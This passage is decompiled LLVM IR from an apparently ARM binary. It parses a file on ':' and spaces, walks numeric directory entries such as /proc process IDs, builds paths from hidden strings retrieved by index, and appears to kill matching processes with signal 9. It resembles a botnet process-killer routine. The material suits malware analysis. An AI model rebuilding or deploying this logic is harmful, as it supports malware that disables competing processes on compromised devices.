  %v4_c9fc = call i32 @function_10778(i8 %v3_c9fc, i32 16, i32 %v2_c9e4)
  %v2_ca04 = call i32 @function_10318(i8* nonnull %stack_var_-72)
  %v7_ca08 = icmp eq i32 %v2_ca04, 2
  br i1 %v7_ca08, label %dec_label_pc_cecc, label %dec_label_pc_ca10

dec_label_pc_ca10:                                ; preds = %dec_label_pc_c964, %dec_label_pc_cecc
  %v1_ca14 = call i32 @function_fd60(i32 15)
  %v1_ca1c = call i32 @function_fd60(i32 16)
  %v1_ca24 = call i32 @function_fd60(i32 17)
  %v1_ca2c = call i32 @function_fd60(i32 19)
  %v0_ca30 = load i32, i32* @r5, align 4
  %v2_ca38 = inttoptr i32 %v0_ca30 to i32*
  %v3_ca38 = call i32 @function_fc9c(i32 19, i32* %v2_ca38)
  %v0_ca3c = load i32, i32* @r5, align 4
  %v2_ca40 = call i32 @function_109e4(i32 %v3_ca38, i32 %v0_ca3c)
  %v7_ca44 = icmp eq i32 %v2_ca40, -1
  store i32 %v2_ca40, i32* @r8, align 4
  br i1 %v7_ca44, label %bb, label %dec_label_pc_ca54.preheader

bb:                                               ; preds = %dec_label_pc_ca10
  %v1_ca4c = load i32, i32* @r5, align 4
  store i32 %v1_ca4c, i32* @r4, align 4
  br label %dec_label_pc_ce68

dec_label_pc_ca54.preheader:                      ; preds = %dec_label_pc_ca10
  %v4_ca6056 = call i32 @function_10578(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca40)
  %v2_ca6458 = icmp eq i32 %v4_ca6056, 0
  br i1 %v2_ca6458, label %dec_label_pc_cbec.loopexit, label %dec_label_pc_ca6c.lr.ph

dec_label_pc_ca6c.lr.ph:                          ; preds = %dec_label_pc_ca54.preheader
  %v2_cab4 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_ca6c

dec_label_pc_ca6c:                                ; preds = %dec_label_pc_ca6c.lr.ph, %dec_label_pc_ca54.backedge
  %v3_ca70 = load i8, i8* %stack_var_-585, align 1
  %v4_ca70 = sext i8 %v3_ca70 to i32
  %v2_ca74 = icmp eq i8 %v3_ca70, 0
  br i1 %v2_ca74, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_ca6c
  %v8_ca78 = icmp eq i8 %v3_ca70, 58
  br i1 %v8_ca78, label %.thread8, label %dec_label_pc_ca8c

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_caa4

bb126:                                            ; preds = %dec_label_pc_ca6c
  br label %dec_label_pc_caa4

dec_label_pc_ca8c:                                ; preds = %bb125
  %v1_ca94.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ca90

dec_label_pc_ca90:                                ; preds = %bb127, %dec_label_pc_ca8c
  %v0_ca90 = phi i32 [ %v1_ca90, %bb127 ], [ 0, %dec_label_pc_ca8c ]
  %v1_ca90 = add i32 %v0_ca90, 1
  %v2_ca94 = add i32 %v1_ca90, %v1_ca94.pre
  %v3_ca94 = inttoptr i32 %v2_ca94 to i8*
  %v4_ca94 = load i8, i8* %v3_ca94, align 1
  %v6_ca94 = zext i8 %v4_ca94 to i32
  %v2_ca98 = icmp eq i8 %v4_ca94, 0
  br i1 %v2_ca98, label %dec_label_pc_caa4, label %bb127

bb127:                                            ; preds = %dec_label_pc_ca90
  %v8_ca9c = icmp eq i8 %v4_ca94, 58
  br i1 %v8_ca9c, label %dec_label_pc_caa4, label %dec_label_pc_ca90

dec_label_pc_caa4:                                ; preds = %dec_label_pc_ca90, %bb127, %bb126, %.thread8
  %v1_cad0 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_ca90, %bb127 ], [ %v1_ca90, %dec_label_pc_ca90 ]
  %v0_caa4 = phi i32 [ %v4_ca70, %.thread8 ], [ %v4_ca70, %bb126 ], [ %v6_ca94, %bb127 ], [ %v6_ca94, %dec_label_pc_ca90 ]
  %v2_caa4 = icmp eq i32 %v0_caa4, 0
  br i1 %v2_caa4, label %dec_label_pc_ca54.backedge, label %dec_label_pc_caac

dec_label_pc_ca54.backedge:                       ; preds = %dec_label_pc_caa4, %dec_label_pc_cb74, %dec_label_pc_cbc0, %dec_label_pc_caf0
  %v0_ca5c = load i32, i32* @r8, align 4
  %v4_ca60 = call i32 @function_10578(i8* nonnull %stack_var_-585, i32 512, i32 %v0_ca5c)
  %v2_ca64 = icmp eq i32 %v4_ca60, 0
  br i1 %v2_ca64, label %dec_label_pc_cbec.loopexit, label %dec_label_pc_ca6c

dec_label_pc_caac:                                ; preds = %dec_label_pc_caa4
  %v1_cab0 = add i32 %v1_cad0, 2
  %v2_cab8 = add i32 %v1_cab0, %v2_cab4
  %v1_cabc = add i32 %v2_cab8, -545
  %v2_cabc = inttoptr i32 %v1_cabc to i8*
  %v3_cabc = load i8, i8* %v2_cabc, align 1
  %v2_cac0 = icmp eq i8 %v3_cabc, 0
  br i1 %v2_cac0, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_caac
  %v8_cac4 = icmp eq i8 %v3_cabc, 32
  br i1 %v8_cac4, label %.thread13, label %dec_label_pc_cad0

.thread13:                                        ; preds = %bb128
  store i32 %v1_cab0, i32* @r5, align 4
  br label %dec_label_pc_caf0

bb129:                                            ; preds = %dec_label_pc_caac
  store i32 %v1_cab0, i32* @r5, align 4
  br label %dec_label_pc_caf0

dec_label_pc_cad0:                                ; preds = %bb128
  %v0_cad0 = load i32, i32* @r6, align 4
  %v2_cad0 = add i32 %v0_cad0, %v1_cad0
  br label %dec_label_pc_cad8

dec_label_pc_cad8:                                ; preds = %bb130, %dec_label_pc_cad0
  %v0_cae416 = phi i32 [ %v1_cae4, %bb130 ], [ %v1_cab0, %dec_label_pc_cad0 ]
  %v0_cae818 = phi i32 [ %v1_cae8, %bb130 ], [ %v2_cad0, %dec_label_pc_cad0 ]
  %v1_cad8 = add i32 %v0_cae818, 3
  %v2_cad8 = inttoptr i32 %v1_cad8 to i8*
  %v3_cad8 = load i8, i8* %v2_cad8, align 1
  %v2_cadc = icmp eq i8 %v3_cad8, 0
  br i1 %v2_cadc, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_cad8
  %v1_cae417 = add i32 %v0_cae416, 1
  store i32 %v1_cae417, i32* @r5, align 4
  br label %dec_label_pc_caf0

bb130:                                            ; preds = %dec_label_pc_cad8
  %v8_cae0 = icmp eq i8 %v3_cad8, 32
  %v1_cae4 = add i32 %v0_cae416, 1
  store i32 %v1_cae4, i32* @r5, align 4
  %v1_cae8 = add i32 %v0_cae818, 1
  br i1 %v8_cae0, label %dec_label_pc_caf0, label %dec_label_pc_cad8

dec_label_pc_caf0:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cafc = phi i32 [ %v1_cae417, %.thread15 ], [ %v1_cab0, %.thread13 ], [ %v1_cab0, %bb129 ], [ %v1_cae4, %bb130 ]
  %v0_caf0 = load i32, i32* @r6, align 4
  %v2_caf0 = add i32 %v0_caf0, %v1_cab0
  store i32 %v2_caf0, i32* @r4, align 4
  %v2_cafc = add i32 %v1_cafc, %v2_cab4
  store i32 0, i32* @r7, align 4
  %v3_cb04 = add i32 %v2_cafc, -545
  %v4_cb04 = inttoptr i32 %v3_cb04 to i8*
  store i8 0, i8* %v4_cb04, align 1
  %v0_cb08 = load i32, i32* @r4, align 4
  %v1_cb0c = inttoptr i32 %v0_cb08 to i8*
  %v2_cb0c = call i32 @function_10318(i8* %v1_cb0c)
  store i32 %v2_cb0c, i32* @r1, align 4
  %v0_cb18 = load i32, i32* @r4, align 4
  %v3_cb1c = inttoptr i32 %v0_cb18 to i8*
  %v4_cb1c = call i32 @function_10668(i8* %v3_cb1c, i32 %v2_cb0c, i32 %v2_c9e4)
  %v7_cb20 = icmp eq i32 %v4_cb1c, -1
  br i1 %v7_cb20, label %dec_label_pc_ca54.backedge, label %dec_label_pc_cb3c.preheader

dec_label_pc_cb3c.preheader:                      ; preds = %dec_label_pc_caf0
  %v1_cb24 = load i32, i32* @r7, align 4
  %v1_cb28 = load i32, i32* @r6, align 4
  %v2_cb28 = load i32, i32* @r5, align 4
  %v3_cb28 = add i32 %v2_cb28, %v1_cb28
  store i32 %v1_cb24, i32* @lr, align 4
  %v1_cb3c48 = add i32 %v3_cb28, 2
  %v2_cb3c49 = inttoptr i32 %v1_cb3c48 to i8*
  %v3_cb3c50 = load i8, i8* %v2_cb3c49, align 1
  %v2_cb4052 = icmp eq i8 %v3_cb3c50, 0
  %v1_cb4454 = add i32 %v2_cb28, 2
  br i1 %v2_cb4052, label %dec_label_pc_cb74, label %dec_label_pc_cb4c

dec_label_pc_cb4c:                                ; preds = %dec_label_pc_cb3c.preheader, %dec_label_pc_cb3c.backedge
  %v0_cb7483 = phi i32 [ %v0_cb7481, %dec_label_pc_cb3c.backedge ], [ %v1_cb24, %dec_label_pc_cb3c.preheader ]
  %v0_cb5c.pr = phi i32 [ %v0_cb5c.pr70, %dec_label_pc_cb3c.backedge ], [ %v1_cb24, %dec_label_pc_cb3c.preheader ]
  %v0_ce7c = phi i32 [ %v0_ce7c73, %dec_label_pc_cb3c.backedge ], [ %v1_cb24, %dec_label_pc_cb3c.preheader ]
  %v0_cb4478 = phi i32 [ %v1_cb44, %dec_label_pc_cb3c.backedge ], [ %v1_cb4454, %dec_label_pc_cb3c.preheader ]
  %v0_cb6c = phi i32 [ %v0_cb3c, %dec_label_pc_cb3c.backedge ], [ %v3_cb28, %dec_label_pc_cb3c.preheader ]
  %v1_cb50.in = phi i8 [ %v3_cb3c, %dec_label_pc_cb3c.backedge ], [ %v3_cb3c50, %dec_label_pc_cb3c.preheader ]
  %v7_cb4c = icmp eq i8 %v1_cb50.in, 9
  br i1 %v7_cb4c, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb4c
  %v8_cb50 = icmp eq i8 %v1_cb50.in, 32
  br i1 %v8_cb50, label %.thread27, label %dec_label_pc_cb5c

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cb68

bb132:                                            ; preds = %dec_label_pc_cb4c
  br label %dec_label_pc_cb68

dec_label_pc_cb5c:                                ; preds = %bb131
  %v7_cb5c = icmp eq i32 %v0_cb5c.pr, 1
  br i1 %v7_cb5c, label %dec_label_pc_ce7c, label %dec_label_pc_cb64

dec_label_pc_cb64:                                ; preds = %dec_label_pc_ce7c, %dec_label_pc_cb5c
  %v0_cb6875 = phi i32 [ %v1_ce7c, %dec_label_pc_ce7c ], [ %v0_ce7c, %dec_label_pc_cb5c ]
  br label %dec_label_pc_cb68

dec_label_pc_cb68:                                ; preds = %bb132, %.thread27, %dec_label_pc_cb64
  %v0_cb68 = phi i32 [ %v0_ce7c, %.thread27 ], [ %v0_ce7c, %bb132 ], [ %v0_cb6875, %dec_label_pc_cb64 ]
  %v0_cb5c.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cb64 ]
  %v7_cb70 = icmp sgt i32 %v0_cb68, 6
  br i1 %v7_cb70, label %dec_label_pc_cb74, label %dec_label_pc_cb3c.backedge

dec_label_pc_cb74:                                ; preds = %dec_label_pc_cb3c.backedge, %dec_label_pc_cb68, %dec_label_pc_cb3c.preheader
  %v1_cbc4 = phi i32 [ %v1_cb4454, %dec_label_pc_cb3c.preheader ], [ %v1_cb44, %dec_label_pc_cb3c.backedge ], [ %v0_cb4478, %dec_label_pc_cb68 ]
  %v0_cb74 = phi i32 [ %v1_cb24, %dec_label_pc_cb3c.preheader ], [ %v0_cb7481, %dec_label_pc_cb3c.backedge ], [ %v0_cb7483, %dec_label_pc_cb68 ]
  %v2_cb74 = icmp eq i32 %v0_cb74, 0
  br i1 %v2_cb74, label %dec_label_pc_ca54.backedge, label %dec_label_pc_cb80

dec_label_pc_cb80:                                ; preds = %dec_label_pc_cb74
  %v2_cb88 = add i32 %v1_cbc4, %v2_cab4
  %v1_cb8c = add i32 %v2_cb88, -545
  %v2_cb8c = inttoptr i32 %v1_cb8c to i8*
  %v3_cb8c = load i8, i8* %v2_cb8c, align 1
  %v2_cb90 = icmp eq i8 %v3_cb8c, 0
  br i1 %v2_cb90, label %dec_label_pc_cbc0, label %bb133

bb133:                                            ; preds = %dec_label_pc_cb80
  %v8_cb94 = icmp eq i8 %v3_cb8c, 32
  br i1 %v8_cb94, label %dec_label_pc_cbc0, label %dec_label_pc_cb9c

dec_label_pc_cb9c:                                ; preds = %bb133
  %v2_cb9c = add i32 %v1_cbc4, %v1_cb28
  br label %dec_label_pc_cba0

dec_label_pc_cba0:                                ; preds = %bb134, %dec_label_pc_cb9c
  %v0_cbac30 = phi i32 [ %v1_cbac, %bb134 ], [ %v1_cbc4, %dec_label_pc_cb9c ]
  %v0_cba0 = phi i32 [ %v1_cba0, %bb134 ], [ %v2_cb9c, %dec_label_pc_cb9c ]
  %v1_cba0 = add i32 %v0_cba0, 1
  %v2_cba0 = inttoptr i32 %v1_cba0 to i8*
  %v3_cba0 = load i8, i8* %v2_cba0, align 1
  %v2_cba4 = icmp eq i8 %v3_cba0, 0
  br i1 %v2_cba4, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cba0
  %v1_cbac31 = add i32 %v0_cbac30, 1
  br label %dec_label_pc_cbb4

bb134:                                            ; preds = %dec_label_pc_cba0
  %v8_cba8 = icmp eq i8 %v3_cba0, 32
  %v1_cbac = add i32 %v0_cbac30, 1
  br i1 %v8_cba8, label %dec_label_pc_cbb4, label %dec_label_pc_cba0

dec_label_pc_cbb4:                                ; preds = %bb134, %.thread29
  %v1_cbbc = phi i32 [ %v1_cbac31, %.thread29 ], [ %v1_cbac, %bb134 ]
  %v2_cbbc = add i32 %v1_cbbc, %v2_cab4
  br label %dec_label_pc_cbc0

dec_label_pc_cbc0:                                ; preds = %dec_label_pc_cb80, %bb133, %dec_label_pc_cbb4
  %v2_cbcc = phi i32 [ %v2_cb88, %dec_label_pc_cb80 ], [ %v2_cb88, %bb133 ], [ %v2_cbbc, %dec_label_pc_cbb4 ]
  %v2_cbc4 = add i32 %v1_cbc4, %v1_cb28
  store i32 %v2_cbc4, i32* @r4, align 4
  %v3_cbcc = add i32 %v2_cbcc, -545
  %v4_cbcc = inttoptr i32 %v3_cbcc to i8*
  store i8 0, i8* %v4_cbcc, align 1
  %v1_cbd0 = inttoptr i32 %v2_cbc4 to i8*
  %v2_cbd0 = call i32 @function_10318(i8* %v1_cbd0)
  %v8_cbd8 = icmp sgt i32 %v2_cbd0, 15
  br i1 %v8_cbd8, label %dec_label_pc_ca54.backedge, label %dec_label_pc_cbdc

dec_label_pc_cbdc:                                ; preds = %dec_label_pc_cbc0
  %v0_cbe0 = load i32, i32* @r4, align 4
  %v2_cbe4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cbe4, i32* @r0, align 4
  %v2_cbe8 = bitcast i32* %stack_var_-56 to i8*
  %v3_cbe8 = call i32 @function_10340(i8* %v2_cbe8, i32 %v0_cbe0)
  br label %dec_label_pc_cbec

dec_label_pc_cbec.loopexit:                       ; preds = %dec_label_pc_ca54.backedge, %dec_label_pc_ca54.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cbec

dec_label_pc_cbec:                                ; preds = %dec_label_pc_cbec.loopexit, %dec_label_pc_cbdc
  %v1_cbfc.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cbec.loopexit ], [ %v2_cbe8, %dec_label_pc_cbdc ]
  %v2_cbf8.pre-phi = phi i32 [ %.pre, %dec_label_pc_cbec.loopexit ], [ %v2_cbe4, %dec_label_pc_cbdc ]
  %v0_cbec = load i32, i32* @r8, align 4
  %v1_cbf0 = call i32 @function_10dd8(i32 %v0_cbec)
  %v2_cbfc = call i32 @function_10318(i8* %v1_cbfc.pre-phi)
  store i32 %v2_cbfc, i32* @r4, align 4
  %v2_cc00 = icmp eq i32 %v2_cbfc, 0
  br i1 %v2_cc00, label %dec_label_pc_cea8, label %dec_label_pc_cc08

dec_label_pc_cc08:                                ; preds = %dec_label_pc_cbec
  %v3_cc10 = call i32 @function_fc9c(i32 15, i32* null)
  %v1_cc14 = call i32 @function_10fd4(i32 %v3_cc10)
  store i32 %v1_cc14, i32* @sb, align 4
  %v2_cc18 = icmp eq i32 %v1_cc14, 0
  br i1 %v2_cc18, label %dec_label_pc_ce48, label %dec_label_pc_cc28.preheader

dec_label_pc_cc28.preheader:                      ; preds = %dec_label_pc_cc08
  store i32 0, i32* @r5, align 4
  %v1_cc2c43 = inttoptr i32 %v1_cc14 to i32*
  %v2_cc2c44 = call i32 @function_11118(i32* %v1_cc2c43)
  %v2_cc3046 = icmp eq i32 %v2_cc2c44, 0
  br i1 %v2_cc3046, label %dec_label_pc_ce3c, label %dec_label_pc_cc38.preheader

dec_label_pc_cc28.loopexit:                       ; preds = %dec_label_pc_cc40, %dec_label_pc_cc50, %dec_label_pc_ccbc
  %v0_cc28 = load i32, i32* @sb, align 4
  %v1_cc2c = inttoptr i32 %v0_cc28 to i32*
  %v2_cc2c = call i32 @function_11118(i32* %v1_cc2c)
  %v2_cc30 = icmp eq i32 %v2_cc2c, 0
  br i1 %v2_cc30, label %dec_label_pc_ce3c, label %dec_label_pc_cc38.preheader

dec_label_pc_cc38.preheader:                      ; preds = %dec_label_pc_cc28.preheader, %dec_label_pc_cc28.loopexit
  %v0_cc4091 = phi i32 [ %v2_cc2c, %dec_label_pc_cc28.loopexit ], [ %v2_cc2c44, %dec_label_pc_cc28.preheader ]
  br label %dec_label_pc_cc38

dec_label_pc_cc38:                                ; preds = %dec_label_pc_cc38.preheader, %dec_label_pc_ce24
  %v0_cc58 = phi i32 [ %v0_cc4091, %dec_label_pc_cc38.preheader ], [ %v2_ce30, %dec_label_pc_ce24 ]
  %v0_cc38 = load i32, i32* @r5, align 4
  %v2_cc38 = icmp eq i32 %v0_cc38, 0
  br i1 %v2_cc38, label %dec_label_pc_cc40, label %dec_label_pc_ce3c

dec_label_pc_cc40:                                ; preds = %dec_label_pc_cc38
  %v1_cc40 = add i32 %v0_cc58, 11
  %v2_cc40 = inttoptr i32 %v1_cc40 to i8*
  %v3_cc40 = load i8, i8* %v2_cc40, align 1
  %v4_cc40 = zext i8 %v3_cc40 to i32
  %v1_cc44 = add nsw i32 %v4_cc40, -48
  %tmp = icmp ugt i32 %v1_cc44, 9
  br i1 %tmp, label %dec_label_pc_cc28.loopexit, label %dec_label_pc_cc50

dec_label_pc_cc50:                                ; preds = %dec_label_pc_cc40
  store i32 %v1_cc40, i32* @r7, align 4
  %v3_cc5c = call i32 @function_fc9c(i32 15, i32* null)
  store i32 %v2_c9bc, i32* @r0, align 4
  %v3_cc68 = call i32 @function_10340(i8* %v2_c9e0, i32 %v3_cc5c)
  %v2_cc70 = call i32 @function_10318(i8* %v2_c9e0)
  %v0_cc74 = load i32, i32* @r7, align 4
  %v1_cc78 = load i32, i32* @sl, align 4
  %v2_cc78 = add i32 %v1_cc78, %v2_cc70
  store i32 %v2_cc78, i32* @r0, align 4
  %v2_cc7c = inttoptr i32 %v2_cc78 to i8*
  %v3_cc7c = call i32 @function_10340(i8* %v2_cc7c, i32 %v0_cc74)
  %v2_cc84 = call i32 @function_10318(i8* %v2_c9e0)
  %v0_cc88 = load i32, i32* @r5, align 4
  store i32 %v2_cc84, i32* @r4, align 4
  %v2_cc94 = inttoptr i32 %v0_cc88 to i32*
  %v3_cc94 = call i32 @function_fc9c(i32 16, i32* %v2_cc94)
  %v0_cc9c = load i32, i32* @r4, align 4
  %v1_cc9c = load i32, i32* @sl, align 4
  %v2_cc9c = add i32 %v1_cc9c, %v0_cc9c
  store i32 %v2_cc9c, i32* @r0, align 4
  %v2_cca0 = inttoptr i32 %v2_cc9c to i8*
  %v3_cca0 = call i32 @function_10340(i8* %v2_cca0, i32 %v3_cc94)
  %v3_ccb0 = call i32 @function_10b3c(i32 %v2_c9bc, i32 %v2_c9ac, i32 4096)
  %v7_ccb4 = icmp eq i32 %v3_ccb0, -1
  br i1 %v7_ccb4, label %dec_label_pc_cc28.loopexit, label %dec_label_pc_ccbc

dec_label_pc_ccbc:                                ; preds = %dec_label_pc_cc50
  %v0_ccbc = load i32, i32* @r5, align 4
  %v2_ccc4 = inttoptr i32 %v0_ccbc to i32*
  %v3_ccc4 = call i32 @function_fc9c(i32 15, i32* %v2_ccc4)
  store i32 %v2_c9bc, i32* @r0, align 4
  %v3_ccd0 = call i32 @function_10340(i8* %v2_c9e0, i32 %v3_ccc4)
  %v2_ccd8 = call i32 @function_10318(i8* %v2_c9e0)
  %v0_ccdc = load i32, i32* @r7, align 4
  %v1_cce0 = load i32, i32* @sl, align 4
  %v2_cce0 = add i32 %v1_cce0, %v2_ccd8
  store i32 %v2_cce0, i32* @r0, align 4
  %v2_cce4 = inttoptr i32 %v2_cce0 to i8*
  %v3_cce4 = call i32 @function_10340(i8* %v2_cce4, i32 %v0_ccdc)
  %v2_ccec = call i32 @function_10318(i8* %v2_c9e0)
  %v0_ccf0 = load i32, i32* @r5, align 4
  store i32 %v2_ccec, i32* @r4, align 4
  %v2_ccfc = inttoptr i32 %v0_ccf0 to i32*
  %v3_ccfc = call i32 @function_fc9c(i32 17, i32* %v2_ccfc)
  %v0_cd04 = load i32, i32* @r4, align 4
  %v1_cd04 = load i32, i32* @sl, align 4
  %v2_cd04 = add i32 %v1_cd04, %v0_cd04
  store i32 %v2_cd04, i32* @r0, align 4
  %v2_cd08 = inttoptr i32 %v2_cd04 to i8*
  %v3_cd08 = call i32 @function_10340(i8* %v2_cd08, i32 %v3_ccfc)
  %v1_cd10 = call i32 @function_10fd4(i32 %v2_c9bc)
  store i32 %v1_cd10, i32* @r8, align 4
  %v2_cd14 = icmp eq i32 %v1_cd10, 0
  br i1 %v2_cd14, label %dec_label_pc_cc28.loopexit, label %dec_label_pc_cd1c.preheader

dec_label_pc_cd1c.preheader:                      ; preds = %dec_label_pc_ccbc
  %v1_cd2038 = inttoptr i32 %v1_cd10 to i32*
  %v2_cd2039 = call i32 @function_11118(i32* %v1_cd2038)
  store i32 %v2_cd2039, i32* @r6, align 4
  %v2_cd2441 = icmp eq i32 %v2_cd2039, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9ac, i32* @r0, align 4
  br i1 %v2_cd2441, label %dec_label_pc_ce24, label %dec_label_pc_cd34thread-pre-split

dec_label_pc_cd1c.loopexit:                       ; preds = %dec_label_pc_cd3c, %dec_label_pc_cdd4
  %v0_cd1c = load i32, i32* @r8, align 4
  %v1_cd20 = inttoptr i32 %v0_cd1c to i32*
  %v2_cd20 = call i32 @function_11118(i32* %v1_cd20)
  store i32 %v2_cd20, i32* @r6, align 4
  %v2_cd24 = icmp eq i32 %v2_cd20, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9ac, i32* @r0, align 4
  br i1 %v2_cd24, label %dec_label_pc_ce24, label %dec_label_pc_cd34thread-pre-split

dec_label_pc_cd34thread-pre-split:                ; preds = %dec_label_pc_cd1c.preheader, %dec_label_pc_cd1c.loopexit
  %v0_cd34.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd34

dec_label_pc_cd34:                                ; preds = %dec_label_pc_cd34thread-pre-split, %dec_label_pc_cdfc
  %v0_cd34 = phi i32 [ %v0_cd34.pr, %dec_label_pc_cd34thread-pre-split ], [ 1, %dec_label_pc_cdfc ]
  %v2_cd34 = icmp eq i32 %v0_cd34, 0
  br i1 %v2_cd34, label %dec_label_pc_cd3c, label %dec_label_pc_ce24

dec_label_pc_cd3c:                                ; preds = %dec_label_pc_cd34
  %v0_cd3c = call i32 @function_103ac()
  %v0_cd40 = load i32, i32* @r5, align 4
  %v2_cd48 = inttoptr i32 %v0_cd40 to i32*
  %v3_cd48 = call i32 @function_fc9c(i32 15, i32* %v2_cd48)
  store i32 %v2_c9bc, i32* @r0, align 4
  %v3_cd54 = call i32 @function_10340(i8* %v2_c9e0, i32 %v3_cd48)
  %v2_cd5c = call i32 @function_10318(i8* %v2_c9e0)
  %v0_cd60 = load i32, i32* @r7, align 4
  %v1_cd64 = load i32, i32* @sl, align 4
  %v2_cd64 = add i32 %v1_cd64, %v2_cd5c
  store i32 %v2_cd64, i32* @r0, align 4
  %v2_cd68 = inttoptr i32 %v2_cd64 to i8*
  %v3_cd68 = call i32 @function_10340(i8* %v2_cd68, i32 %v0_cd60)
  %v2_cd70 = call i32 @function_10318(i8* %v2_c9e0)
  %v0_cd74 = load i32, i32* @r5, align 4
  store i32 %v2_cd70, i32* @r4, align 4
  %v2_cd80 = inttoptr i32 %v0_cd74 to i32*
  %v3_cd80 = call i32 @function_fc9c(i32 17, i32* %v2_cd80)
  %v0_cd88 = load i32, i32* @r4, align 4
  %v1_cd88 = load i32, i32* @sl, align 4
  %v2_cd88 = add i32 %v1_cd88, %v0_cd88
  store i32 %v2_cd88, i32* @r0, align 4
  %v2_cd8c = inttoptr i32 %v2_cd88 to i8*
  %v3_cd8c = call i32 @function_10340(i8* %v2_cd8c, i32 %v3_cd80)
  %v2_cd94 = call i32 @function_10318(i8* %v2_c9e0)
  %v1_cd9c = load i32, i32* @sl, align 4
  %v2_cd9c = add i32 %v1_cd9c, %v2_cd94
  store i32 %v2_cd9c, i32* @r0, align 4
  %v2_cda0 = inttoptr i32 %v2_cd9c to i8*
  %v3_cda0 = call i32 @function_10340(i8* %v2_cda0, i32 ptrtoint (i32* @global_var_1616c.60 to i32))
  %v2_cda8 = call i32 @function_10318(i8* %v2_c9e0)
  %v0_cdac = load i32, i32* @r6, align 4
  %v1_cdac = add i32 %v0_cdac, 11
  %v1_cdb0 = load i32, i32* @sl, align 4
  %v2_cdb0 = add i32 %v1_cdb0, %v2_cda8
  store i32 %v2_cdb0, i32* @r0, align 4
  %v2_cdb4 = inttoptr i32 %v2_cdb0 to i8*
  %v3_cdb4 = call i32 @function_10340(i8* %v2_cdb4, i32 %v1_cdac)
  %v3_cdc4 = call i32 @function_10b3c(i32 %v2_c9bc, i32 %v2_c9ac, i32 4096)
  %v7_cdc8 = icmp eq i32 %v3_cdc4, -1
  br i1 %v7_cdc8, label %dec_label_pc_cd1c.loopexit, label %dec_label_pc_cdd4

dec_label_pc_cdd4:                                ; preds = %dec_label_pc_cd3c
  %v2_cdd4 = call i32 @function_10318(i8* %v2_c9cc)
  store i32 %v2_cdd4, i32* @r1, align 4
  %v4_cde8 = call i32 @function_10668(i8* %v2_c9cc, i32 %v2_cdd4, i32 %v2_cbf8.pre-phi)
  %v7_cdec = icmp eq i32 %v4_cde8, -1
  br i1 %v7_cdec, label %dec_label_pc_cd1c.loopexit, label %dec_label_pc_cdfc

dec_label_pc_cdfc:                                ; preds = %dec_label_pc_cdd4
  %v0_cdf4 = load i32, i32* @r7, align 4
  %v2_cdfc = inttoptr i32 %v0_cdf4 to i8*
  %v3_cdfc = call i32 @function_1043c(i8* %v2_cdfc, i32 10)
  %v2_ce04 = call i32 @function_10ba4(i32 %v3_cdfc, i32 9)
  %v0_ce08 = load i32, i32* @r8, align 4
  %v1_ce0c = inttoptr i32 %v0_ce08 to i32*
  %v2_ce0c = call i32 @function_11118(i32* %v1_ce0c)
  store i32 %v2_ce0c, i32* @r6, align 4
  %v2_ce10 = icmp eq i32 %v2_ce0c, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9ac, i32* @r0, align 4
  br i1 %v2_ce10, label %dec_label_pc_ce24, label %dec_label_pc_cd34

dec_label_pc_ce24:                                ; preds = %dec_label_pc_cd1c.loopexit, %dec_label_pc_cdfc, %dec_label_pc_cd34, %dec_label_pc_cd1c.preheader
  %v0_ce24 = load i32, i32* @r8, align 4
  %v1_ce28 = inttoptr i32 %v0_ce24 to i32*
  %v2_ce28 = call i32 @function_10e0c(i32* %v1_ce28)
  %v0_ce2c = load i32, i32* @sb, align 4
  %v1_ce30 = inttoptr i32 %v0_ce2c to i32*
  %v2_ce30 = call i32 @function_11118(i32* %v1_ce30)
  %v2_ce34 = icmp eq i32 %v2_ce30, 0
  br i1 %v2_ce34, label %dec_label_pc_ce3c, label %dec_label_pc_cc38

dec_label_pc_ce3c:                                ; preds = %dec_label_pc_cc28.loopexit, %dec_label_pc_ce24, %dec_label_pc_cc38, %dec_label_pc_cc28.preheader
  %v0_ce3c = load i32, i32* @sb, align 4
  %v1_ce40 = inttoptr i32 %v0_ce3c to i32*
  %v2_ce40 = call i32 @function_10e0c(i32* %v1_ce40)
  %v0_ce44 = load i32, i32* @r5, align 4
  %v1_ce44 = urem i32 %v0_ce44, 256
  br label %dec_label_pc_ce48

dec_label_pc_ce48:                                ; preds = %dec_label_pc_cc08, %dec_label_pc_ce3c
  %storemerge = phi i32 [ %v1_ce44, %dec_label_pc_ce3c ], [ 0, %dec_label_pc_cc08 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce4c = call i32 @function_12ef0(i32 1)
  %v1_ce54 = call i32 @function_fcc0(i32 15)
  %v1_ce5c = call i32 @function_fcc0(i32 16)
  %v1_ce64 = call i32 @function_fcc0(i32 17)
  br label %dec_label_pc_ce68

dec_label_pc_ce68:                                ; preds = %bb, %dec_label_pc_cea8, %dec_label_pc_ce48
  %v0_ce68 = load i32, i32* @r4, align 4
  store i32 %v3_c964, i32* @r4, align 4
  store i32 %v6_c964, i32* @r5, align 4
  store i32 %v9_c964, i32* @r6, align 4
  store i32 %v12_c964, i32* @r7, align 4
  store i32 %v15_c964, i32* @r8, align 4
  store i32 %v18_c964, i32* @sb, align 4
  store i32 %v21_c964, i32* @sl, align 4
  store i32 %v24_c964, i32* @fp, align 4
  store i32 %v27_c964, i32* @lr, align 4
  ret i32 %v0_ce68

